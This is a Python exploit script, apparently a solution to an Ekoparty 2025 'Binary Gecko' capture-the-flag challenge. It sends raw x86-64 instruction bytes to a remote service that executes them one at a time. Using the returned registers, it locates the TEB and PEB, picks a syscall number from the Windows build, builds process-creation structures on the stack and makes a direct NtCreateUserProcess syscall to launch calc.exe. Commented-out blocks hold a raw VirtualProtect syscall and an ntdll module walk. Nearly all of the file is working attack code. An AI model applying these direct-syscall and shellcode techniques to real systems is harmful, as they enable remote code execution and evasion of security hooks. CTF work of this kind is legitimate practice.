import socket
import struct
import ctypes
import binascii
import sys

HOST = '192.168.23.1'
PORT = 20259
MOV_MEM_CHECK = b'\x48\x8B\x0A' #Mov rcx, [RDX] used for memory location checks
MOV_RCX_RIP_OFF = b'\x48\x8B\x0D' # Mov rcx, [rip+X] prelude for offset checks.
MOV_RDX_RCX_PEB = b'\x48\x8B\x51\x60' # mov rdx, [rcx+0x60] move the PEB into RDX
MOV_R8_RDX_IMG_HDR = b'\x4C\x8B\x42\x10' # mov r8, [rdx+0x10] move potential image header into place.
MOV_R8_RDX_RTL_PROC = b'\x4C\x8B\x42\x20' # mov r8, [rdx+0x20] RTL_PROC_PARAMS for current proccess (hack for calc).
MOVABS_RSP = b'\x48\xBC' # base for movABS rsp

debug = False

if len(sys.argv) > 1:
  HOST = sys.argv[1]
else:
  sys.exit(f'Usage {sys.argv[0]} $HOST')

remote_registers = {}
teb_location = b''
peb_location = b''
image_base = b''
initial_rip = b''
process_params_ptr = b''
atribute_list_ptr = b''
possible_teb = 0
syscall_eax = b'\xB8\xC9\x00\x00\x00'
ntdll_location = b''

syscall_options = {b'0000000000002800':b'\xba', b'000000000000295a':b'\xbb', b'0000000000003839':b'\xbd', b'0000000000003ad7':b'\xc0', b'0000000000003fab':b'\xc1', b'00000000000042ee':b'\xc2', b'0000000000004563':b'\xc3', b'00000000000047ba':b'\xc4', b'00000000000047bb':b'\xc4', b'0000000000004a61':b'\xc8', b'0000000000004a62':b'\xc8', b'0000000000004a63':b'\xc8', b'0000000000004a64':b'\xc9', b'0000000000004a65':b'\xc9', b'0000000000004f7c':b'\xcd', b'00000000000055f0':b'\xce', b'000000000000585d':b'\xcf', b'0000000000005867':b'\xcf', b'0000000000006336':b'\xd0', b'00000000000065f4':b'\xd1', b'00000000000065f4':b'\xd1', b'0000000000006658':b'\xd1'}


def prep_qword_asm(pointer):
  return struct.pack('<Q',pointer)

def prep_instruction(instruction):
  return struct.pack('<i',len(instruction))+instruction

def send_instruction(sock, instruction):
  sock.send(prep_instruction(instruction))
  #readable, test, exceptional = select.select([sock], [], [sock], 1)
  data = sock.recv(1024)
  if b'RAX:' in data:
    return data
  else:
    return False

def avengers_assembly(socket,assembly):
  for instruction in assembly:
    data = send_instruction(socket,instruction)
    if data:
      update_registers(data)
    else:
      #failed_func = binascii.unhexlify(instruction)
      print(f'Instruction Failed: {instruction}')
      socket = start_connection() 
  
def start_connection():
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((HOST, PORT))
  sock.sendall(b'Ekoparty 2025 - Binary Gecko challenge')
  welcome = sock.recv(50)
  data = sock.recv(1024)
  update_registers(data)
  return sock

def update_registers(registers):
  for register in registers.split(b' '):
    key, value = register.split(b':')
    remote_registers[key] = value

def build_rip_offset(amount):
  value = ((amount & 0x80000000) | (amount & 0x7fffffff))
  #print(hex(value))
  return MOV_RCX_RIP_OFF+struct.pack('<I',value)

s = start_connection()

while(debug):
  print(send_instruction(s,binascii.unhexlify(input("Instruction:"))))

#Hunt for the Peb/Teb because it's to early to be in GS[] yet
initial_rip = int.from_bytes(binascii.unhexlify(remote_registers[b'RIP']),byteorder="big") #Setup the initial RIP position to do rip relative testing.
possible_teb = initial_rip - 0x29 #The instruction is 7 bytes long for a relative request, and the TEB self pointer is at 0x30
print(hex(initial_rip))

'''

while teb_location == b'':
  print(possible_teb)
  data = send_instruction(s,build_rip_offset(-possible_teb))
  if data:
    update_registers(data)
    if (binascii.unhexlify(remote_registers[b'RCX']) != b'0000000000000000'): #(initial_rip - possible_teb - 0x29)): #Assuming initial RIP > TEB (TODO, fix later)
      print('Possible TEB?')
      print(hex(initial_rip-possible_teb-0x29))
      data = send_instruction(s,MOV_RDX_RCX_PEB) ## Move the Possible PEB into RDX
      if data:
        update_registers(data)
        tmp_teb_location = remote_registers[b'RCX']
        tmp_peb_location = remote_registers[b'RDX']
        print(f'TEB FOUND? {tmp_teb_location}')
        print(f'PEB FOUND? {tmp_peb_location}')
        data = send_instruction(s,MOV_R8_RDX_IMG_HDR)
        if data:
          update_registers(data)
          tmp_img_header = remote_registers[b'R8']
          print(f'Image Header FOUND? {tmp_img_header}')
          if (int.from_bytes(binascii.unhexlify(tmp_img_header),byteorder="big") > 0x7f0000000000):
            teb_location = tmp_teb_location
            image_base = tmp_img_header
            peb_location = tmp_peb_location
            data = send_instruction(s,MOV_R8_RDX_RTL_PROC)
            update_registers(data)
            process_params_ptr = remote_registers[b'R8']
          else:
            possible_teb -= 0x1000
        else:
          print('Not Yet :(')
          s = start_connection()
          possible_teb -= 0x1000
      else:
        #print('Instruction Failed')
        s = start_connection()
        possible_teb -= 0x1000
    else:
      possible_teb -= 0x1000
  else:
    #print('Instruction Failed')
    s = start_connection()
    possible_teb -= 0x1000

'''

#Mov TEB into RAX
data = send_instruction(s,b'\x65\x48\x8b\x04\x25\x30\x00\x00\x00')
if data:
  update_registers(data)
else:
  print('Instruction Failed')
  s = start_connection()

teb_location = remote_registers[b'RAX']



data = send_instruction(s,b'\x48\x8B\x50\x60')
if data:
  update_registers(data)
else:
  print('Instruction Failed')
  s = start_connection()

peb_location = remote_registers[b'RCX']


data = send_instruction(s,MOV_R8_RDX_RTL_PROC)
if data:
  update_registers(data)
else:
  print('Instruction Failed')
  s = start_connection()

process_params_ptr = remote_registers[b'R8']


#version_check_asm = [b'\x48\x31\xC9', b'\x66\x8B\x8A\x20\x01\x00\x00' #xor rcx,rcx & mov cx, [rdx+0x120]] - Get Build Number

data = send_instruction(s,b'\x48\x31\xC9')
if data:
  update_registers(data)
else:
  print('Instruction Failed')
  s = start_connection()
  
data = send_instruction(s,b'\x66\x8B\x8A\x20\x01\x00\x00')
if data:
  update_registers(data)
else:
  print('Instruction Failed')
  s = start_connection()


syscall_eax = b'\xB8' + syscall_options[remote_registers[b'RCX']] + b'\x00\x00\x00'

print(binascii.hexlify(syscall_eax))

while(debug):
  print(send_instruction(s,binascii.unhexlify(input("Instruction:"))))

syscall_ptr = remote_registers[b'RSP']
if syscall_ptr.endswith(b'8'): #set to 0 cause we're faking the full call stack.
  print("Kernel aligned")
else:
  data = send_instruction(s,b'\x48\x83\xC4\x08')
  if data:
    update_registers(data)
  else:
    print('Instruction Failed')
    s = start_connection()

#make a virtualprotect call
'''
vprotect_asm = [b'\x48\x8b\x4a\x20',# put address into rcx
b'\x33\xdb',#xor ebx
b'\x4c\x8d\x4c\x24\x50',#lea r9, [rsp+0x50]
b'\xba\xb0\x00\x00\x00',#mov edx size
b'\x89\x5c\x24\x50',#dword ptr [rsp+50h],ebx
b'\x41\xb8\x40\x00\x00\x00' #mov r8, 0x40
] 


#Just took raw ASM from kernelbase to fake the function call
vprotect_raw_asm = [b'\x48\x8b\xc4', #mov rax,rsp
b'\x48\x89\x58\x18', #mov     qword [rax+0x18 {__saved_rbx}], rbx
b'\x55', # push
b'\x56', #push
b'\x57', #push
b'\x48\x83\xec\x30', #sub RSP x30
b'\x49\x8b\xf1', #mov rsi, r9
b'\x4c\x89\x48\xd8',# qword [rax-0x28 {var_28}], r9
b'\x45\x8b\xc8', # mov r9d,r8d
b'\x48\x89\x50\x08',#mov     qword [rax+0x8 {MemoryLength}], rdx
b'\x41\x8b\xe8',#mov     ebp, r8d
b'\x48\x89\x48\x10',#mov     qword [rax+0x10 {MemoryCache}], rcx
b'\x4c\x8d\x40\x08',#lea     r8, [rax+0x8 {MemoryLength}]
b'\x48\x83\xc9\xff',#or      rcx, 0xffffffffffffffff
b'\x48\x8d\x50\x10',#rdx, [rax+0x10 {MemoryCache}]
b'\x48\x83\xEC\x08',#sub rsp, 0x8 (mimic call)
b'\x4C\x8B\xD1', #MOV r10,rcx
b'\xB8\x50\x00\x00\x00',#Virtual Protect Syscall eax, 0x50
b'\x0F\x05'] # syscall

print('Preparing Vprotect arguments ldr')
avengers_assembly(s,vprotect_asm)

print('Preparing Vprotect syscall')
avengers_assembly(s,vprotect_raw_asm)

while(debug):
  print(send_instruction(s,binascii.unhexlify(input("Instruction:"))))

ldr_walk_asm = [ #mov    rcx,QWORD PTR [rdx+0x18]
b'\x4c\x8b\x51\x20', #mov    r10,QWORD PTR [rcx+0x20]
b'\x4d\x8b\x1a', #mov    r11,QWORD PTR [r10]
b'\x4D\x8B\x23', #mov    r12,QWORD PTR [r11]
b'\x4D\x8B\x6C\x24\x48', #mov    r13,QWORD PTR [r12+0x48]
b'\x4D\x8B\x75\x08'] #mov    r14,QWORD PTR [r13+0x8] first dll string.

flink_walk_asm = [b'\x4D\x8B\x13', #mov    r10,QWORD PTR [r11] next link
b'\x4D\x8B\x1A', #mov    r11,QWORD PTR [r10]
b'\x4D\x8B\x23', #mov    r12,QWORD PTR [r11]
b'\x4D\x8B\x6C\x24\x48', #mov    r13,QWORD PTR [r12+0x48]
b'\x4D\x8B\x75\x08' #mov    r14,QWORD PTR [r13+0x8]
#mov    r12,QWORD PTR [r11]
#mov    r13,QWORD PTR [data = send_instruction(s,b'\x4D\x8B\x3E')
]

print("ldr walking")
avengers_assembly(s,ldr_walk_asm)

print("module walking")
#first dll check
while (ntdll_location == b''):
  data = send_instruction(s,b'\x4D\x8B\x3E')
  if data:
    update_registers(data)
    if remote_registers[b'R15'] == b'006c00640074006e': #ntdl
      send_instruction(s,b'\x49\x83\xC6\x08')
      data = send_instruction(s,b'\x4D\x8B\x3E')
      if data:
        update_registers(data)
        if remote_registers[b'R15'] == b'006c0064002e006c': #l.dl
          data = send_instruction(s,b'\x4d\x8b\x6c\x24\x20') #get base address
          if data:
            update_registers(data)
            ntdll_location = remote_registers[b'R13']
            print(f'ntdll base: {ntdll_location}')
        else:
          avengers_assembly(s,flink_walk_asm)
    else:
      avengers_assembly(s,flink_walk_asm)
  else:
    print('Instruction Failed')
    sys.exit()
    s = start_connection()
'''
client_id_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big")
image_info_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big") + 0x10
stdhandle_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big") + 0x50
image_name_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big") + 0x58

attributes_objects_asm = [b'\x48\x31\xC9',
b'\x48\x89\x0C\x24',
b'\x48\x89\x4C\x24\x08',
b'\x48\x89\x4C\x24\x10',
b'\x48\x89\x4C\x24\x18',
b'\x48\x89\x4C\x24\x20',
b'\x48\x89\x4C\x24\x28',
b'\x48\x89\x4C\x24\x30',
b'\x48\x89\x4C\x24\x38',
b'\x48\x89\x4C\x24\x40',
b'\x48\x89\x4C\x24\x48',
b'\x48\x89\x4C\x24\x50',
b'\x48\x83\xC4\x58']


calc_string = [b'005c003f003f005c',b'0057005c003a0043',
b'006f0064006e0069', b'0073005c00730077',
b'0065007400730079', b'005c00320033006d',
b'0063006c00610063', b'006500780065002e']

for calculator in calc_string:
  attributes_objects_asm.append(b'\x48\xB9' + prep_qword_asm(int.from_bytes(binascii.unhexlify(calculator),byteorder="big")))
  attributes_objects_asm.append(b'\x48\x89\x0C\x24')
  attributes_objects_asm.append(b'\x48\x83\xC4\x08')

print(attributes_objects_asm)
print(f"client_id: {client_id_ptr}, \r\n image_ptr: {image_info_ptr}, \r\n stdhandle: {stdhandle_ptr}, \r\n image_name: {image_name_ptr}")
avengers_assembly(s,attributes_objects_asm)

attribute_list_asm = [] #add rsp,0x60

attributes_list_objects = [int.from_bytes(binascii.unhexlify(b'00000000000000a8'),byteorder="big"),
int.from_bytes(binascii.unhexlify(b'0000000000020005'),byteorder="big"), int.from_bytes(binascii.unhexlify(b'0000000000000040'),byteorder="big"), image_name_ptr, int.from_bytes(binascii.unhexlify('0000000000000000'),byteorder="big"),
int.from_bytes(binascii.unhexlify(b'0000000000010003'),byteorder="big"), int.from_bytes(binascii.unhexlify(b'0000000000000010'),byteorder="big"), client_id_ptr, int.from_bytes(binascii.unhexlify(b'0000000000000000'),byteorder="big"),
int.from_bytes(binascii.unhexlify(b'0000000000000006'),byteorder="big"), int.from_bytes(binascii.unhexlify(b'0000000000000040'),byteorder="big"), image_info_ptr, int.from_bytes(binascii.unhexlify(b'0000000000000000'),byteorder="big"),
int.from_bytes(binascii.unhexlify(b'000000000002000a'),byteorder="big"), int.from_bytes(binascii.unhexlify(b'0000000000000008'),byteorder="big"), stdhandle_ptr, int.from_bytes(binascii.unhexlify(b'0000000000000000'),byteorder="big"),
int.from_bytes(binascii.unhexlify(b'000000000006001a'),byteorder="big"), int.from_bytes(binascii.unhexlify(b'0000000000000001'),byteorder="big"), int.from_bytes(binascii.unhexlify(b'0000000000000001'),byteorder="big"), int.from_bytes(binascii.unhexlify(b'0000000000000000'),byteorder="big")]
for attributes in attributes_list_objects:
  attribute_list_asm.append(b'\x48\xB9' + prep_qword_asm(attributes))
  attribute_list_asm.append(b'\x48\x89\x0C\x24')
  attribute_list_asm.append(b'\x48\x83\xC4\x08')


atribute_list_ptr = remote_registers[b'RSP']
print(f"attribute_list_ptr: {atribute_list_ptr}")
avengers_assembly(s,attribute_list_asm)


#Now that we have a PEB/TEB we can have the initial proccess parameters to steal
#   +0x020 ProcessParameters : 0x00000000`00bf22d0 _RTL_USER_PROCESS_PARAMETERS
# Create info Assembly
'''
xor rcx,rcx
movabs rax, 0x00058
movabs rdx, 0x0000008120000003
mov [rsp], rax
mov [rsp+0x8], rcx
mov [rsp+0x10], rdx
mov [rsp+0x18], rcx
mov [rsp+0x20], rcx
mov [rsp+0x28], rcx
mov [rsp+0x30], rcx
mov [rsp+0x38], rcx
mov [rsp+0x48], rcx
mov [rsp+0x50], rcx
mov [rsp+0x58], rcx

add rsp,0x60
'''
create_info_asm = [b'\x48\x31\xC9', #xor rcx,rcx
b'\x48\xB8\x58\x00\x00\x00\x00\x00\x00\x00', #movabs rax, 0x00058
b'\x48\xBA\x03\x00\x00\x20\x81\x00\x00\x00', #movabs rdx, 0x0000008120000003
b'\x48\x89\x04\x24', #mov [rsp], rax
b'\x48\x89\x4C\x24\x08', #mov [rsp+0x8], rcx
b'\x48\x89\x54\x24\x10', #mov [rsp+0x10], rdx
b'\x48\x89\x4C\x24\x18', #mov [rsp+0x18], rcx
b'\x48\x89\x4C\x24\x20', #mov [rsp+0x20], rcx
b'\x48\x89\x4C\x24\x28', #mov [rsp+0x28], rcx
b'\x48\x89\x4C\x24\x30', #mov [rsp+0x30], rcx
b'\x48\x89\x4C\x24\x38', #mov [rsp+0x38], rcx
b'\x48\x89\x4C\x24\x48', #mov [rsp+0x48], rcx
b'\x48\x89\x4C\x24\x50', #mov [rsp+0x50], rcx
b'\x48\x89\x4C\x24\x58', #mov [rsp+0x58], rcx
b'\x48\x83\xC4\x60'] #add rsp,0x60

create_info_ptr = remote_registers[b'RSP']
print(create_info_ptr)
avengers_assembly(s,create_info_asm)

'''
movabs rcx, 0x0000002f858fe4a0 #AttributeList
movabs rdx, 0x0000002f858fe070 # Createinfo
movabs r9, 0x000001fd79223370 #procpara
mov [rsp+0x58], rcx #AttributeList
mov [rsp+0x50], rdx # Createinfo
mov [rsp+0x48], r9 #procpara
xor rcx, rcx #XOR for null values, doing this out of order for small effciency increase
mov [rsp+0x60], rcx #null ptr for thread/proccess handle
mov [rsp+0x68], rcx
mov [rsp+0x30], rcx
mov [rsp+0x28], rcx
inc rcx #Thread flags = 1
mov [rsp+0x40], rcx
add rcx, 0x1ff #Procflags = 200
mov [rsp+0x38], rcx
mov eax, 0x2000000 #Desired Proc/Thread Access
mov r9d, eax
mov r8d, eax
lea rdx, [rsp+0x60] # null ptr threadhadle
lea rcx, [rsp+0x68] # null ptr prochandle
mov eax, 0xc9
syscall
'''
prep_syscall_asm = [b'\x48\xB9' + prep_qword_asm(int.from_bytes(binascii.unhexlify(atribute_list_ptr),byteorder="big")), #rsp +0x58
b'\x48\xBA' + prep_qword_asm(int.from_bytes(binascii.unhexlify(create_info_ptr),byteorder="big")), #rsp +0x58 
b'\x49\xB9' + prep_qword_asm(int.from_bytes(binascii.unhexlify(process_params_ptr),byteorder="big")), #\x00\x30\x22\x79\xFD\x01\x00\x00 
b'\x48\x89\x4C\x24\x58', #mov    QWORD PTR [rsp+0x58],rcx
b'\x48\x89\x54\x24\x50', #mov    QWORD PTR [rsp+0x50],rdx
b'\x4C\x89\x4C\x24\x48', #mov    QWORD PTR [rsp+0x48],raf9
b'\x48\x31\xC9', #xor rcx,rcx
b'\x48\x89\x4C\x24\x60', #mov    QWORD PTR [rsp+0x60],rcx
b'\x48\x89\x4C\x24\x68', #mov    QWORD PTR [rsp+0x68],rcx
b'\x48\x89\x4C\x24\x30', #mov    QWORD PTR [rsp+0x30],rcx 
b'\x48\x89\x4C\x24\x28', #mov    QWORD PTR [rsp+0x28],rcx 
#b'\x48\xFF\xC1', #inc    rcx 
b'\x48\x89\x4C\x24\x40', #mov    QWORD PTR [rsp+0x40],rcx
b'\x48\x81\xC1\x00\x02\x00\x00', #add    rcx,0x1ff
b'\x48\x89\x4C\x24\x38', #mov    QWORD PTR [rsp+0x38],rcx
b'\xB8\x00\x00\x00\x02', #mov    eax,0x2000000
b'\x44\x8B\xC8', #mov    r9d,eax 41 89 c1  
b'\x44\x8B\xC0', #mov    r8d,eax 41 89 c0 
b'\x48\x8D\x54\x24\x60', #lea    rdx,[rsp+0x60]
b'\x48\x8D\x4C\x24\x68', #lea    rcx,[rsp+0x68]
syscall_eax,#, #mov    eax,0xc9 Might need to get syscall from ntdll
b'\x4C\x8B\xD1' #MOV r10,rcx
]

syscall_ptr = remote_registers[b'RSP']
if syscall_ptr.endswith(b'8'):
  print("Kernel aligned")
else:
  data = send_instruction(s,b'\x48\x83\xC4\x08')
  if data:
    update_registers(data)
  else:
    print('Instruction Failed')
    s = start_connection()

syscall_ptr = remote_registers[b'RSP']
print(f'syscall stack location: {syscall_ptr}')

avengers_assembly(s,prep_syscall_asm)

data = send_instruction(s,b'\x0F\x05') # syscall
if data:
  print("popped calc")
  popped = True
  

while(debug):
  print(send_instruction(s,binascii.unhexlify(input("Instruction:"))))
  

print('ending')